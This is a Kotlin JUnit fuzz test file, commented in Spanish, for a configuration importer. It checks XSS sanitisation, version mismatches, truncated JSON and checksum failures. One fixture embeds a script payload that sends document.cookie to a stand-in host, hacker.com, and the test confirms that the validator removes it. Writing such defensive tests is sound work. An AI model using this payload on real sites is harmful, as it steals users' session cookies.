package com.sponsorflow.security

import com.sponsorflow.utils.ConfigurationImporter
import com.sponsorflow.utils.ImportResult
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import java.security.MessageDigest

/**
 * FUZZ TESTING MOTOR (V2.0) - Capa de Importación de Archivos.
 * Somete el validador JSON a escenarios de Hackeo por Importación de Configuraciones.
 */
class ImporterFuzzTest {

    private fun generateChecksum(input: String): String {
        val md = MessageDigest.getInstance("SHA-256")
        return md.digest(input.toByteArray()).joinToString("") { "%02x".format(it) }
    }

    @Test
    fun testImport_SpintaxMaliciousScriptInjection() {
        val maliciousJson = """
            {
                "export_version": "v4.0",
                "stealth_mode_active": true,
                "spintax_template": "Hola {nombre}, visita <script>fetch('http://hacker.com?c='+document.cookie)</script> mi tienda.",
                "company_rules": "Reglas de oro de mi empresa."
            }
        """.trimIndent()
        
        val checksum = generateChecksum(maliciousJson)
        val result = ConfigurationImporter.parseConfigFileSafely(maliciousJson, checksum)
        
        assertTrue("La capa debió procesar un archivo íntegro pero peligroso", result is ImportResult.Success)
        val success = result as ImportResult.Success
        
        // Comprobar que el atacante XSS fue desarmado
        assertTrue("El Validador falló defendiendo contra inyección de Script XSS", success.template.contains("[SCRIPT REMOVIDO]"))
    }

    @Test
    fun testImport_VersionCollision() {
        // Intentar importar un backup del Sponsorflow V3.0 en la V4.0 sin adaptadores (Debe fallar)
        val v3Json = """
            {
                "export_version": "v3.0",
                "stealth_mode_active": false,
                "spintax_template": "Hola",
                "company_rules": "Reglas."
            }
        """.trimIndent()
        
        val checksum = generateChecksum(v3Json)
        val result = ConfigurationImporter.parseConfigFileSafely(v3Json, checksum)
        
        assertTrue("El validador debió denegar el JSON por colisión de versiones.", result is ImportResult.Failure)
        val failure = result as ImportResult.Failure
        assertEquals("Incompatibilidad de versión. Se requiere v4.0. No hay script de migración activo.", failure.reason)
    }

    @Test
    fun testImport_FuzzTipoDatoYMutilacion() {
        // Enviar un Payload donde 'stealth_mode_active' requiere un BOOLEANO pero el hacker manda un String Aleatorio (o un archivo corrupto que quedó por la mitad)
        val malformedJson = """
            {
                "export_version": "v4.0",
                "stealth_mode_active": "Super mega string asdfkasdlkfjasdklfajsdfkla",
        """.trimIndent() 
        // FALTA CERRAR EL JSON (Simulando archivo pesado descargado por la mitad)

        val checksum = generateChecksum(malformedJson) // Checksum coincide pero la anatomía está rota
        val result = ConfigurationImporter.parseConfigFileSafely(malformedJson, checksum)
        
        assertTrue("El validador debió rechazar la operación por parser malformado (EOF Error).", result is ImportResult.Failure)
        val failure = result as ImportResult.Failure
        assertEquals("El archivo no es un JSON válido o está incompleto.", failure.reason)
    }
    
    @Test
    fun testImport_BadChecksum() {
        val validJson = """
            {
                "export_version": "v4.0",
                "spintax_template": "Hola",
                "company_rules": "Reglas."
            }
        """.trimIndent()
        
        // Simular que el archivo fue modificado (Bit rot) en la nube y el checksum ya no coincide
        val badChecksum = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" 
        
        val result = ConfigurationImporter.parseConfigFileSafely(validJson, badChecksum)
        
        assertTrue("El validador debió rechazar el archivo por Checksum corrupto.", result is ImportResult.Failure)
        val failure = result as ImportResult.Failure
        assertEquals("Checksum fallido. El archivo está corrupto o fue manipulado.", failure.reason)
    }
}
